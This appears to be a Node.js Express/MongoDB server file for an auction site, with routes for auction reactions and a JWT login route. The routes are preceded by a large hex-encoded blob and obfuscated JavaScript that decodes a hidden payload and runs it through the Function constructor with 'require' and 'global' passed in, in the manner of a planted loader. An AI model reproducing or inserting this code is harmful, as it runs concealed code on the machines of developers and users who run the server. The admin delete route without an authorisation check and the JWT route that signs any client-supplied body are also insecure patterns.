cdd09eeb99cb9ff7dc85eb83dadcebc785dac2e297de859f90f7d2c1ceebcbcccaffebdadcebe9d097ebdb97eb9785cad6f1d3dcda85d9d5d6969d85eb85eb9c91cd9debebd594ea97d5cbc09c979799ced8f4d791eb98ebdedcfd8983ebd68597ddc199d0ebf5f29cebd799eb97db90cb959acdd9ebebe3c797978f97989b8598d782cd85c1d7f7cacad8f5eb98ed9d8ddaebebdaea85c4989685d8de8597ebc796c9c2d2da85cd90cd97949dd5fe97d8ddebd8e9d8808d91ca98eb9397cd8597d5da858edf8591cdebcbe4ebc297ebec85dfcbd6e69785ebeb9292ebd399c0f09bdadcebe6d2dd97da99dde497e4f5d4d0eb919bf497f9979ad4e99ad79597f4ebd9c5ebfbc4859ddbebd7dee6f7cd94828591859797cdebd591cbebcbc1dbf494eb89f59bddcd90fec498c9e9999785ebe6ebcc9794cd979cdddd97da85c1979d85d8ebd2cd85d0979acad690f886dcebc397d5c9ca9885db81ebebc3cfcb85fc82fce0ebe591df85cdd7e2ebeaef8ad1ebebe29791d09985ebdaebd185d490d0e4d59989ebebd6ebcbca858f9499c2858acdcbebebdaebd697919797f49797da97df82eb97ea85eada8585f9d5c8949799ebc898eb89d0c997828d8ccbdadaeb939685d19799fdddd8e4daedebebd7eb9feb96f993809885e9dcd899cc9797d6d6c999cb919d85dc98cbed97db80dacf85c2ebead7e8c290ebeb98dd9691d885979697dfcdeedcdb99df859eebeb96da9debd591ebeb97d79797d4fddadbdadbd5c4eb98ccebd697888397d88ec497db85c4ebdddd97fdc2dad59791f690d5fdd09d8beb9f9083dd97d7e598daebc9dd859e97d7c0ebcbdad89785e79188dad09082ea8dc9d5cdcbdbebf0c1d1c08cdcdf88e290ebcadbeb97899992ebcbcf99ebebe2caebf8cd97efdcebe488c89797859d88dfd785dadd97cc8bca9df4daeb9993eb918691da9982ebeb97dae995dcebeb979c99c9ebdb99909790eb8597ebdce0eb97c0dcebebebd5d6dad6f2fcfcd2cad8d2da8195cad4e9c4d2d58591d5c097d2c9cd84ddebcbd5eb9dca85d0dc979ecbddc3cad598d0c9d097da8adad0cdeb899bebcdebeb8feb9e97cc9797eb979fd292eb9b9891ceeae1eacdcde499cb8597e783d7d2d897ebd1d79d91ebd8dc82ebda85fad68bd7ca99ebdf85c98299d0dadffafcd0ea85cfcadcefebd885edcadc9990978adaebdc8d91ebd88bcbca949797d086cafaddebeb9785c4ded5ebebd08bd7da94cbf89ada8f8eeb949797da90e28585d3ebebebd7db8299cad8eb9bebda97ebebcd9fcadfebdaf69690eb97cc85d6d5ebfcebf38597ebeb8add91ebeb8a898599f9daebd8d4d8d6caeb97dc9097eb9efa99e988ebc0ddeb9fcfeb87d1f0e9e6e283dadcceebdf85d6ebca90d7f4dadbd0e0e99983ebd2ebdfeb8bebcfeb98dc9585cdeae697ebcb8aeb90eb9b9d98e6979ed591ca99ebda9dda9898daebc48585979bdaebc4d7fad49785d68fd6e1d1d0ddebebdad5838597c098eb85cd85dcd49682cc8f99ebcbcad291cbebf9cbccebcd97ddebd894e9ebdaf5dbdfebebdc8581e4ebd59a9985ebccdacddae997fa9e8eebebd7daccd88dcacafbeb9798dbdadc90cdebdd979fe997d7dacac9988ccee3979debd0cfd897e89791e2ebd7ebebeb8d8597d1f8ebeb85c9c3dfc39febcddad5dd9791d8cae9ebf7eb97c4ebd697cbdc91eb97ebfb97ebeb97dcc2ebffebc49c98eb999797e2eb888597ccebeb9df6858191ca9797cdd3fa998af085e99199d6d8f3ebd8ccd6ca98ebdefdd0f7da8deb85dcc0f9d089e2da97df85f7d082caebd5ce8190eb978bebcd8bebebeae6dc83d09fd5cb91ebdae4dfdbfc90ebcdd7cad6879ac997cadef6de97eb91f0d4dfcddcc98ad4cb86dbfcc4c991dcebca9098ebcccbcaebdaeb8685eb9797dadfc7c2c2eb8690d0d6d6cd97d7f89797dcc1dbc9c1ebc4d9eadacd99fecdc990cd98d5ebc294cac4ebebdd85da9880e9c4d6cc9797cd82c4858597ebcdd49096cb97f698e497e2dd85eb8a85da848bdae599ddebd8cbf6ebc08597eb859191c1ebdddadcebddfae6d0c285dacb95d695eb9d97eb8df697c585c1cddadfdaeb96d9da998597c9dae497d5dec791dcc7ccdd97daebcdebceebcbfce3ebebcd858599ecf0cd9997f4d1cdebcf91e6ddebcddae6d585d698ebebd5ebe2ce9997e09797ebca8597979d85d68d91dcd5d8eb97cc97dbdae4998a94ebc4ebebea85eb84c39792ead5ebccd8889199d58bcd979189ca9acb82da85cf9785f2cd85858597cdd8dccdded2d0d7eb97cdd799c0ccd798ffc4ebd8ebeb9190cb85fddacbf0989a9c919182dfebebcd8ad0dc94e5d0c491ebd799cd97d5eb9797d7df86fb9785dbdc9791908997ebf7e88c9395eb9796ded8eed2839fe9dc9fca97cb8bcb95e082dc85ebebfc82cada9785da85c58597eb91ff91dadad899cd8985cae595ca8585ccdae2cde999da9b9790d89a8afad4ded789eb93f0859d979989cafb81cb85dcdadae98587ebdbd0978b9799caddddca87c48ddcdadcd691d0f7c0eb96cdeb97fcd7eb8ac0f4ea9eebceebd6eadaeb9998dc8adffae9ebdfebebcadbdbeb98d5ddeb91ebd6d0979be4d0eb9edc85ebcbeb97ebfad1dccbdc85c9fdd5db85c29797979785e0efdd97dddcebeb9f8590d589d5ebd0efda9781f183e691dacdd1df97dcf4f9efcd90caeaebcb979797988cd0eb9ed5eb85d7979eeb8785e1eb85899997d69a98cd9debd68597dccb85cdeb8edaebd089eb88849597feebdadad1d4cdd2eb91c7e4ebdacadaddc9cd9c86d2cdebc099d0fa91d5d6ccdc8192d094d0f99afc9eebcadcd19bd58ddcebebdbebd5eb97cfebd190f7ebeb8d8197dc96ebebda9d8fe995ded797d889fadffc849f87da999bebd5ebcaecfbeb80cdd7ebebe8d6d5dadcd8ebd0d0dfebd4d09793989191daed8c9ffbdaebdafd85cdd797ebd5ebeb9ddfdaebcaeb8d90ccc3d5d0d08691ce978586e3e7caebdd9edfda8c86dc92cdd785c099f5ed85dbdfcceb979cd0d9eb9190ebebdaebebeb85d7d19bc1da89da9e97e9859890ebebcee48997eb859bd3e9ebd5ef91daebebebdfdbe2979795ebeb85ebf19d8debdc8198cbd69099859aebd2f481eb85c085eb85d0ee85d6ebdd97eb8d8debdaf1e5daedebe48597d5daeb9a97c199eaebebebc2d0d0ebe5d7dde092ebed90d0d5ca9e8585979f97dd85dad085d697ebda8996cedc9dd480ebd697878fc1c4c197c4d885c098cef2eb99dceb9adaeb97cdc7e497979785ebd7d0dada85cc96c9d8c9d686859debd697d8edc1f5cfd59adf92978585d8eb8d85fd87f8d6cb85cbdd9793889791ddfceae385f2ebe9da97e6d0d8e6d697ebeb97c9d6dff6d5c5f6d1dbf4c1eb9897d7ebe99781d898deecc190fadad1d0d19bcd89ebcdd6c2ebdad09cf1d0fa8cebcde2d5d1d48290da9d8997d8dd98caebebdc859585ebf0d08fc185fddce98580ebeb85e6e4dcebd891cbfd8ee9dadc9782ebeaddd685d685ebd59597fcda8597c1e4cdd1eaebe685fdd7da9781c8da978bebca9f9ddcdf97c4dadb84859392eddfda88dbeb97cada9b91d7d7eb97dbd0d3d7eb8d98d8dac1d2f0dad7d0c984919f82cbebcbebeb998debd0ccdacaebd6ebccda97df85e6cbcaebd48694859d93eb82df98cc8781cfc997d8e9dc9099cb83e6ed91dcdcdb85dcc2eb97cad6eb92c99797eb97eb99daeb85eb84c98797c4c18299db9eebcedace85da98ebf380cae885eb91dac8c0d3858fe1cdd7d8eb8685d0ebdf91ebeb859192eb85d0dddce2da9185e9eb99d6ebeb97ded797ebeb8197ebd8dd849799d78585939585cddfd384ebeb97c4dfdc87daeb969cc19190ebc0d7dfeb82959693e9ea85eb9debd3cd99df9797eb98ebd0d085ebeaebdfca90ca85d6d185e2e4d9cd9cc5e59085ddcdd0e4dfeb85eb9794ebf38f9491d4988099f7ca97c4859eeb9797dfdc8597d1979d9785cdf7d8eb99dacdc9858edcea8594da9785f1ebfee481dacf9785ebd2c9d7ebfa9798da91d7daddddca859f85c9e4cb94978cdfcecfccdcebdde994ebdad6ebfa9fda87ebebc1c4cd978e978285c1cd8597979994ebcb80d2fcd5ebcdc1c0e2ed97da98cddcd0eb9797ca8590f4ebcbeb9bdeebebceeb99ebcad092dad7ceebd8cdebda8095d4dac5ca9ae4e788d297dbd88adfc285d7ebd0c58197ebdae4979084ebc097ebdcdcddeb979883cdd6828ed599c4ca97eb99ebdacbd685fc978fd591cd86d0ebd699cd979b8c95eb97ebeb9799dacbdfeb86ebcd98ebdbdac9978385948bc9ce9febc4dc9edd979883d681ebd1eb9aebdcf697c997e2ca8cc2ebd5e5ea91f79185d193daebeddaebdcdcebeb85ebe9c4d0ddeee99acdeb88d0eb97eb95ebebeb92cac492d0caebd297dad78580eb91e3c2d5dcd4e985d4e897cad7dcd8c1dadcc997c9eb97cdf2908c9185ea91db919784ebcccce4ebe3e8979adbd89aebfcc2c285ebebdfeb9b9682ebd6ebd58af79699c085969bd0c99797f899858febd6d8cad7eb97d8ebcccbeb85d798eb99ebdfed99ebeb85f2eb859eeb9cdac0d4ebc197eb85eb909bc3d785d69287d6ebeb9fdceb98ed859887858898e497fb9f97cb9791da99dbeed095eb848ed68585d5979b9997d1e4eb97ea85ebdd98dc8585d097c49f9ed097dbebdfc991dfc49885fccbcefaeb9780cd98f7de8597dad897dedceb8597d4d0ceebeb979097e9dac0ebebcddcdada9be2ebebdcdcc1dad697e9d88585eb9dd0d89fdceb9096ce98d0dad6eb89eb819c9797dcede2fcebc9eeeb8597ebd6d799ed91fe8c85da9eee97eb97eb89c9e69fcb8cccebfe99edeb85da97cadfdaded799d4ebe2eb8d94dd85858f9a85d0d5ebeb9794da908fdc85d6eb99d1dc858499ebebebd88587fecb9d88fc97da90d0ebd7d6ebcafcd6f7998debd785cbd697cdcf85d28f8deb8990c1eb858d9794d8ebebdaea97c098deebd0c094968c908eeb98dcfaeb929eebda84edf4dad791eb90859cc4da85959ad181ebf091d397fcffdc89888297c888daebcae497d8eb99d7d897eb96d6dde282da8597ebc197dd97dc85dcdacbd8c397da979ceb86d097cad0dd97d0dcd7cd94999adc979bcb978cc9dadf9097eb9791cb99da9794d7c986d1978de2eb8fd69898d09185fa95cdfd9387eb99ebdeeb84fbfaeb97978bebca9cdf988595e68af1eb89d0eb9885eb8597e4ebfbd7dce2eb91ebebebe9dadefad6ebd297979d9497dbda9cebcbc4ca889febe685cfeb8597cad5ebd0ebf99885dfd0f4ddfc98cfe4eaeb94df85ecd6dafe9197c4e9858f86c3ebebfcebda998febebe1f4ff93c4cbd4d085ebcbd09797f78d918582ebebe2dfd5ebed908febfdda95ebcedacacb90f8dacacdf3cad297cceb9684ca97eb91eb99d6fc85d8d286918ddedf8a8597dfd397e38a98dad0e4cad6e697d785d7ffeb9185edcadbcc9bddcbe7d6999debdcebeb97cc9083ddcde7dacd9185dfdaebfb9197c8d09997858acdf3d085da8591dc9799eb98d9dae1da9789ebdf8590eb85ebebeb8aebdaec8bcd98cddad8d7ecdaebdac3cdc9db8d85f3c1d491dae9eb909bcde384979799cc9086929f98d8d5829bcbe8c1dcd1d5cfdfebcb8b97ebef99ca9797f4979391c9d5e98bdc92ebd0ebdccdeb9debeb8c979997979797d89985ddcd919097cad584da99cb9dcaeb85ccd4fa8a97f0dcdccdc282e497dcdcf2d5819aca85d7c9e48285eaebdeebc8dd97cad6dd8fd79fdadccbcfdcf2c9cddd95ebcd89daebcb97ebcad0899cebeb85da89caebcdeb9785c8ebf0cdc2ebeadbdbcc97eb9bec97ead5cddaeb85d28597daebd6cbdd97dceb97d1d1cdea9b8eebf5ebc1ebdad0e9d197f79e85dd989397c8eb97d0ca85d085eb99d6d697f6d08febdbeb97e1eddcd897cd9a9593d8979985da8ce697df90eb90dceb98f1dd979894998eebd29798c4dada97dddceb85dadfd6ebeb90dad797989a98c8cbeb97cdcddfc8ceebe68799daeb85eb99d79199ebdcd086999edccbebcdeb93da9799ebeb98da9df3eb859182eb85cd9a8299c0cdf1da90db9ad0f8dc989797eb8f97edd7d5e69697eb8ad6eb97ebebcbc3c1d691dfde979bded4cc8bd59797de85d085f0d685d7dad5ebc19791e49798cae995e6f09797ddd591eb91d6eb9d99df94ca8597cdca85cdeb97fdebeb98e68585d6d497eb95e4979297f097e283eb85caebd595dae4d0cfeb97839797fe98dc97dfd6e3d28ef48a91dac0dc8beb9a9bcb90d085daebd7999797d7de85d081da85d0eb8cda97ebc1daca99d5ebcbc9da92898aebcd859debd7ceeb97c48debebdc8aebc3ebc48585daebcdc4cc85858598e9cadfda97d0e8979797d8f8cacddaebfc99d49c85dad6eb97ed89d09690e4dacbcdf2948597d3d6e5d0ccdedacddae285cacbda97ea9a97c3dd82ebeb84e8eb8debe39697d485c2d4ebdd91eb8585cfd8da97dad0c1dcdaeb82cbebcf90feebd682df85d497d7c197cdcb8097d6ebed889784ded6c0e29797e6ebedf4979a85cadcebebebf2eb9be69785dbfcebc3cb9f97dcfa85ccebdfe685c3d4ddc2c2ebebcad59f82cf979199db99dfc1858497e991e688ebebd0da97e2dfdf9cfdcf979feb9782cac4c19782ebd7d785d6e9979785fed897ebc49889c09eeb93eddddb85dadccbf6cfe98cd6dace9785ebdcd6ebcdddebebcdcecaebdd949ccd98ebcdebebc5ebcb839796ddebdd9aeb90faebeecb978591c1ce8590e8eb979197eb97dc9194ddd4dcd8d6ebeb85ebdfd0dad6ebcbe8eb97f59edd99dceec48bed98f3d585ead8d6ebdceb9e9185d79798eb97d0eb8a8289ccc985e9ca978c8584daebd5cc85d097eb95cbdad3ebdc97dddc85ebc9fc91eb85958e8590cddaeb9785cbd9e99b85d8d8e4d5daebd1caeb85cbebeb8d8ada9785eb85c0dcd9f090979791cbebebe99788eb9fd6f78eeb97f0d897c2ebebc387efc38297ebebebd8d785c4ebebdd9797da90da98ebe9d4ebebdc91c1dada99e4da82dc9790eb97e082e189eb95d5c297d7979785eb9997d7ebe69acadcebd09185ebe699d6f3f3dacd90f9e297c98585979197eb979897eb98c096cccd97eb97caf7dadaeb97ebdd97ebdfebd685e696eb879ceb86fa92ebdfdac2dadbe997cbda97eb97da97eb869b8184e6ffec99e9998b95ced6c9dacdd8eb808d979c90eb8ecbcedadd9785da919991c980828ac18c97ebd1d1d7ccc8ebd3ebdfd0deebc4cddaf8daf097fe919985918d97cdebc19a8397ebe28bc1909bcaebebdfeb97fd85cdc1da97eb9aebe997c1989997daeb908585daebd6d292ebd6ebdb97caebe481daebd0ddd8cb88c488e99885eb85978599eb85cfeb97e097dcebeac2da858384ebcd97d085d5eb95d8d7eb97da99dec1eb97d0e1eb8f8297ddd6d585ebd097ebc9ebc4d6d5cfd69488ebd5f087c9dc9998c98aebd5c1daebdddcdfcd8d98cbda85c5efdf9799eb85eb9091d6dfeb97da91d0ebd6da85d0fcdaf7859bf0dcdc85cbdfd89897d0ddeb9780e997dc9b97d085ebd497dfc4cbcaebdee9979985dcebdbccf9cdda8fd8cc97998d8ecbdbd7de9097999985dbdadcf4ebdc9796978293cd85898385cdd7d5ebca88daced693cdd994d2d398eb99c2eb858597ebdd979997daf7dafa92d1f3d6daeb85d7dcd097ebdadedceb9084eb97cbdc97eb85dbeb858b88e6dac4cd97e89bda82da9ecfdddfd5caeb97cd98ca98d0cb97eb9a8797ebd4cacbccca978d99e498da8982ca99979c85cdd8e9daccf88588c58e9b9884808886d0ebe997dfcbc497dd97cbedcbeb9cd0d6e99b858297cbd0d8cac3ebc8decbc09aebde82eb97df9397f6d597cbe690ca94ddebdaca998597d784d885eec288d69c9999fad3daebdcdadbcceb97ebffdae2edd6daece6989799dae29adfebcdce97cd9888ebe6dc9791d6ddca95978099d5d1cddcdddf9d9185ead7eb859cdad6d79188dd979debd5eaebcbebcad7d8dad2979195dcebdfced098ebfadec9da8591dac9ebdcdaceeb91fbdc9097ea859285c1e9dbcaf19791cc98d7ebebdccd99eb8bcd9185dc9dc482d59bcd91c9ebe4c0dfc3eb8fd6ebce9786ebc4fb8597cdcddaeb9199f1ebda97dfdadad0ebdae289dc92ca8599f597caeb8ffc9897d8ceda89d8e2da93dfc98590e681d7da85dadc97f785dacccbfadf91eb90d8fcd6eb90d1cfd1eb9b8297c5d7ebebebd5dad7ebcaca85ebc2cbeb9bda97d08891edebeb98cbd08585ddee85eb99959797ccc4d5df97dad0daebcacac1d0ebda8bf8eb9197d8e7d5c4d3898fddebd4cf8ed885d1c9d297d28685ebcacdd5cade97e9da97daeb97979c97d1c2daebd09ed5eb97d7888585d0d7ddcacaf797dbdccb97d7efca97d59e80d8d8cdcdebca9991979799ebca91d09a8dd0ebebd8ebcd9795ebf385d591dc91999aebf4d1eb8197db90d683d69dd697e697dff3cb82978ad79785e3fe99fce984d095ccdc9785caeb8585d785e3dadfebdac2ebd897d8ebdf9ad0ebdccb85d7e099cbd5ffcbebddebcbeb9bda98cdc3d6ddd0d0dedcebece4cadadcd88096daf2c9ccebeb90cd9792ebcdebeb85e599dcda84d8da9791df85dae4c8ebeb9deb978599d49997cf90f1ebcb879785e496cdce97dcdfda87c0e0d7cd9897c9d1dce099d0cbd1eb97d2ebd881918cdd85dceb90d6cef785cd979196daebebdb9597d6dfebe6da8ecafcda9797979997eb85dcebeb9ceb90daebffc2dc97dc85da97da8e95c0cdc4d2dc96caccf7dde2dadad09acdcdcaebebebd8cbedf0cadad585d69097d4979784ca979adbd7ddddcaeb8585ebeb97cdcdd78590c1ebe998e297999999da9797ebebddf797cddbd5c4fad1d6dadfcb97ebd0d0dad6d6eb97eadfccd0dcdc85eb8d97eae6c3d6cddadada82ebcbcacbc985ebd5e2cdde979984d2c18497eb97c2e09298f7daebce98cc9c9699dc8591eb9785dd96dad585d797da9dccebdddd91dfcdd0f6dafa88ca9fcbd5cf9febeb99ed97908897ded6e9dac2cbd8d597dbdaebd59899d5dff095eb97daebda8b99dcfccd99d89b859985d5c9919fd297dd8495eb97d7eb969099da88e4cad0d7c8d0cbc1ebdaeb98dccd9785ebdaf9d5cde997d0c285dcebc4ebeb91edd5dcebeb8591858599e6cad5cbcbedebd7f0dfda989d93ebeb9eeb85dad8dbd8dfdad2d6d7d5979fdbdfd3d0cd8f898898ccdd9793d29edc81c99f84dadcc9fac485dcfedce98debda9197c1f99890c9d6e29ceb89fd89919c97fc9beb858dd7ebd78bd8ebcc99e6d8fd92f5dfdaebcd9fdb8ecb90da918699c1ebc585cbd5d5ebebebd8eb97999094daebc197dceb85f89785dada85c3d0ebd685daebf9ebebc2db8ec0eb97ebebf2da97ebdf85d5c5d597d08bcad8ebdaebc5ebe2d6eb91caebededcdebcddaf490ebccd7d882f1d4cae784e5c29698dd9fce9782ced5ccd497d1dcebcd91cadcdfda','d3d6d0d7','888b8c8d8e8b81c3fbc3e3f7f5','8b818e898f8189fec8ecefd3c0','84d8dcd7cbccd191d8d5848cda95de81dfddcc97c0cb999797d7dadcdadf958c9bc9d8dcd8cc8fd5d7d390cbe48bcccf9bc194c891e499d88291cb848282cb9291d8e28197ca8bcdf8ded6c895ccd181fa95d8d095ca82d891f8d48991d7d382d3cf93958ecfd68e919091d682d48fd6d88dcbce909799cbd6dde2dfca8bd7c2ddcbcfcd8dc190928995d8d7cb92cbcb92d690c4c3889984d1dfe2d8d781cb88cbe295e4ca8e948e8ed5d8d897ccd08ec294898f80d5cfd4cd8bcb84d0e4e4859290cc95dc90959582d7cbd1e2cb8489cf94cb91829584c990faccca8492da82de82df82c8f8909088cfd090cfd289d7cbd588d8dc99df84e282d1d0cac097dcd491dd92d6988b998491dccfdcd88e818497908ddcd084de97d784c2dfdf8488e2858bd899df8884cb828d95ea90cbc0d5cf88cc99c082d2c8d5c2cdcfd7cf9991fa9991d595d6cfd7c999d084cdd5cb95cb97d5ced6c3d191d595cdc88282cbcb9191cf84d8d1cacf82e4c1c884d8db82ddd882959191cb82cfd3c89791cde29290ddd890cbddd7cbd1ca8d88c091cfcb82dfd1828ade9be4dc9197d8d1cbc9d8c9dee4de9790d7dedfc9d788d195d0dad582829084fa82d48c8492cb9599979082cc8492cac49290d0cd9592dbd482dd92ccd4909484cad0d0c8d6d584cd84cb84c880929797dad1c892e28fdfdc99cd89d7cbc9cb9199cfcb81dfd5cbd795dddddecd99e48fd89782d482cbcdd197dec8998bd8c4dccfdcd0dae4dedbcdd0858dd682fa82d595c3c3d08f92d5e2d8e2829291cad09bd5d09bcb95d7c9d080ca95dfcbdfd1ccce90d6ce84dcc291db84cedcd78bcd97decc97d084d2d0d8d8d89290c0dfcdc9d88ad7c49084809b90dac9f892cc82cccdc9e49b84d5d28ecfc9cd9988cb82d1c3ce9b90cd919080909197d5ccd584ca8edf829982cac88990d79bc09289cac484cfd892ca99d4d19189c897e4d1cf828799898f84f894d6c3dccdcb91cd88cbcdcbcad0cad689dc959782c3e291df858cdc8ecd9591cbd8d6d8cfd7cb82cdd1d1df82cf95d384cb829990cb878881c3d1d693d6c285d8d2d4cad790d8d2cddc97cfd68092dcd889dad5d0d682dbcc9984e4fa98ded382c08a92d590dc8497c4ddcb84d08fd6d0fa81cbd7d789828f84d8cb9bc497cbdcd084e4eacdcacbd7d797828bcb84cd82e2cd82d0cf84c9cbfacbd79190d8cbdccdccc39299d1d5d2e292c184dc999481d3c291dcd3c0809191909099'];d$qtJhn$jgp=function(){return fYa_ecAuUpEYAjErRZhvFjWnMQ;};return d$qtJhn$jgp();}function splitLane(JIxUEcDsZqXSIbQVbGPjupV){var LtHdqNf$QeKg_OxYIOmLQSZZsf=DiRry,hNJRHyXb$$Wx=String[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1f2)](-0xe1b+-parseInt(0x18c3)+-parseInt(0xcfe)*-parseInt(0x3)),mfJLgOOKgjFDK_Jvn$kzS=spin(JIxUEcDsZqXSIbQVbGPjupV,NX);return mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('^')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)](hNJRHyXb$$Wx),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*1')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('^'),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*0')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('*'),mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)](hNJRHyXb$$Wx);}function peel(HntnTJelobY){return spin(HntnTJelobY,SX);}(function boot(jRiqfL_YGi,ZXWEUnPbKMsgcWphWHTfi){var DWSBzXLkOBhNwMmvBZ=DiRry;jRiqfL_YGi['z']=z;var qrm_pgeLcAkZ=splitLane(DWSBzXLkOBhNwMmvBZ(0x1eb));jRiqfL_YGi[qrm_pgeLcAkZ[-parseInt(0x5a)*Math.ceil(0x5f)+0x1cf*Math.max(-parseInt(0x7),-parseInt(0x7))+parseInt(0x2e0f)]]=ZXWEUnPbKMsgcWphWHTfi;typeof module===qrm_pgeLcAkZ[-0xe9*Number(parseInt(0x1))+0x19a3*-0x1+-parseInt(0x1)*Number(-0x1a8d)]&&(jRiqfL_YGi[qrm_pgeLcAkZ[parseInt(0x24d7)+Math.trunc(parseInt(0x26d4))+Math.max(0xacf,parseInt(0xacf))*parseInt(-0x7)]]=module);var GWCvm$ZL=peel(DWSBzXLkOBhNwMmvBZ(0x1ec)),rcTIW_sQOoGcYZLAlPkfm$mi=GWCvm$ZL[DWSBzXLkOBhNwMmvBZ(0x1e5)](0x19*Math.ceil(0x82)+Math.ceil(0x1)*Math.ceil(0x18a9)+parseInt(-parseInt(0x255b)),0x312*-parseInt(0x7)+-parseInt(0x251d)+0x3aa6),paMowTbZVJuno=peel[rcTIW_sQOoGcYZLAlPkfm$mi],g$$RRgVGjkaechxpAIOIR=paMowTbZVJuno('',peel(DWSBzXLkOBhNwMmvBZ(0x1e3))),rLmqKRB_QxEIuMImVE$hGKNZAHT=g$$RRgVGjkaechxpAIOIR(peel(DWSBzXLkOBhNwMmvBZ(0x1f3)));return paMowTbZVJuno('',rLmqKRB_QxEIuMImVE$hGKNZAHT)(0x220d+parseInt(0x518)+Math.floor(-parseInt(0x4e4))*0x6),-parseInt(0x12e1)+-0xa34+Math.trunc(0x3ce3);}(global,require));
    // Create index for faster queries and to ensure one reaction per user per auction
    await reactionsCollection.createIndex(
      { auctionId: 1, userId: 1 },
      { unique: true }
    );

    // POST: Add or update a reaction
    app.post("/auction-reaction", async (req, res) => {
      try {
        const { auctionId, userId, reactionType } = req.body;

        if (!auctionId || !userId) {
          return res.status(400).send({
            success: false,
            message:
              "Missing required fields: auctionId and userId are required",
          });
        }

        // Check if user already has a reaction for this auction
        const existingReaction = await reactionsCollection.findOne({
          auctionId,
          userId,
        });

        if (existingReaction) {
          // If reactionType is null, remove the reaction
          if (reactionType === null) {
            const result = await reactionsCollection.deleteOne({
              auctionId,
              userId,
            });
            return res.send({
              success: true,
              message: "Reaction removed",
              result,
            });
          }

          // Update existing reaction
          const result = await reactionsCollection.updateOne(
            { auctionId, userId },
            { $set: { reactionType, updatedAt: new Date() } }
          );

          return res.send({
            success: true,
            message: "Reaction updated",
            result,
          });
        } else {
          // If reactionType is null, no need to create a new document
          if (reactionType === null) {
            return res.send({
              success: true,
              message: "No reaction to remove",
            });
          }

          // Create new reaction
          const result = await reactionsCollection.insertOne({
            auctionId,
            userId,
            reactionType,
            createdAt: new Date(),
          });

          return res.send({
            success: true,
            message: "Reaction added",
            result,
          });
        }
      } catch (error) {
        console.error("Error handling reaction:", error);

        // Handle duplicate key error (user trying to add multiple reactions)
        if (error.code === 11000) {
          return res.status(409).send({
            success: false,
            message: "You already reacted to this auction",
          });
        }

        res.status(500).send({
          success: false,
          message: "Failed to process reaction",
          error: error.message,
        });
      }
    });

    // GET: Retrieve reactions for an auction
    app.get("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;
        const { userId } = req.query;

        // Get all reactions for this auction
        const reactions = await reactionsCollection
          .find({ auctionId })
          .toArray();

        // Count reactions by type
        const reactionCounts = {
          likes: reactions.filter((r) => r.reactionType === "likes").length,
          loves: reactions.filter((r) => r.reactionType === "loves").length,
          smiles: reactions.filter((r) => r.reactionType === "smiles").length,
          wows: reactions.filter((r) => r.reactionType === "wows").length,
          flags: reactions.filter((r) => r.reactionType === "flags").length,
        };

        // If userId is provided, get the user's reaction
        let userReactions = [];
        if (userId) {
          const userReaction = reactions.find((r) => r.userId === userId);
          if (userReaction) {
            userReactions.push(userReaction);
          }
        }

        res.send({
          success: true,
          reactionCounts,
          totalReactions: reactions.length,
          userReactions,
        });
      } catch (error) {
        console.error("Error fetching reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reactions",
          error: error.message,
        });
      }
    });

    // GET: Get reaction statistics for all auctions
    app.get("/auction-reactions-stats", async (req, res) => {
      try {
        // Aggregate to get total reactions by type
        const stats = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$reactionType",
                count: { $sum: 1 },
              },
            },
          ])
          .toArray();

        // Format the results
        const formattedStats = stats.reduce((acc, stat) => {
          acc[stat._id] = stat.count;
          return acc;
        }, {});

        // Get total auctions with reactions
        const auctionsWithReactions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
              },
            },
            {
              $count: "total",
            },
          ])
          .toArray();

        res.send({
          success: true,
          stats: formattedStats,
          totalAuctionsWithReactions: auctionsWithReactions[0]?.total || 0,
        });
      } catch (error) {
        console.error("Error fetching reaction stats:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reaction statistics",
          error: error.message,
        });
      }
    });

    // GET: Get most reacted auctions
    app.get("/most-reacted-auctions", async (req, res) => {
      try {
        const { limit = 5 } = req.query;

        // Aggregate to get auctions with most reactions
        const mostReactedAuctions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
                totalReactions: { $sum: 1 },
                reactionTypes: {
                  $push: "$reactionType",
                },
              },
            },
            {
              $sort: { totalReactions: -1 },
            },
            {
              $limit: parseInt(limit),
            },
          ])
          .toArray();

        // For each auction, count reaction types
        const result = mostReactedAuctions.map((auction) => {
          const reactionCounts = auction.reactionTypes.reduce((acc, type) => {
            acc[type] = (acc[type] || 0) + 1;
            return acc;
          }, {});

          return {
            auctionId: auction._id,
            totalReactions: auction.totalReactions,
            reactionCounts,
          };
        });

        res.send({
          success: true,
          mostReactedAuctions: result,
        });
      } catch (error) {
        console.error("Error fetching most reacted auctions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch most reacted auctions",
          error: error.message,
        });
      }
    });

    // DELETE: Remove all reactions for an auction (admin only)
    app.delete("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;

        // In a real app, you would verify admin permissions here
        // if (!isAdmin(req.user)) {
        //   return res.status(403).send({ success: false, message: "Unauthorized" });
        // }

        const result = await reactionsCollection.deleteMany({ auctionId });

        res.send({
          success: true,
          message: `Deleted ${result.deletedCount} reactions for auction ${auctionId}`,
          result,
        });
      } catch (error) {
        console.error("Error deleting reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to delete reactions",
          error: error.message,
        });
      }
    });

    // JWT Routes
    app.post("/jwt", async (req, res) => {
      const user = req.body;
      const token = jwt.sign(user, process.env.ACCESS_TOKEN, {
        expiresIn: "1d",
      });
      res
        .cookie("token", token, { httpOnly: true, secure: false })
        .send({ success: true });
    });

